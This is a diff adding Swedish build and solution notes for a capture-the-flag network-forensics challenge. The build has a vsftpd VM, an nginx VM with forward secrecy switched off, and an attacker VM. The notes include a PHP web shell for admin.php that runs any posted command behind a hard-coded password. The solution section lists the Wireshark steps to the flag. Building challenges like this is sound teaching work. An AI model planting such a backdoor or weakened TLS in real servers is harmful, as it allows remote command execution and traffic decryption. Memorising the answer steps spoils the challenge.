@@ -1,0 +1,23 @@
+Byggnad:
+
+Du skall ha 3 VM:ar uppe. En ska köra vsftpd, den andra ska köra nginx och den tredje ska vara en angripare.
+1. Generera egna SSL-certifikat (eller återanvänd de från website_stuff) och stoppa in de i nginx. Var märksam med att stänga av PFS.
+
+1a. Installera och sätt på php-fpm i nginx.
+
+1b. I /var/www/html ska filen `admin.php` skapas med koden 
+```
+<?php
+if ($_POST['ADMIN_PASSWORD'] === 'UnCr4ck4bl3_P455W0RD')
+	system($_POST['cmd']);
+?>
+```
+2. Kasta in website_stuff mappen i VM:en med vsftpd på.
+
+3. Starta Wireshark och gör en inspelning på när angriparen ftp:ar in på vsftpd-maskinen, laddar ner alla hemligheter, för att sedan köra en curl mot nginx-maskinen.
+
+Lösning:
+1. Öppna pcap:en i Wireshark.
+2. Spara TCP-strömmen från frame 154 till någon fil.
+3. Lägg till filen som du nyss sparade till dina lokala RSA-nycklar i Wireshark.
+4. Gå till frame 184 och läs av flaggan.
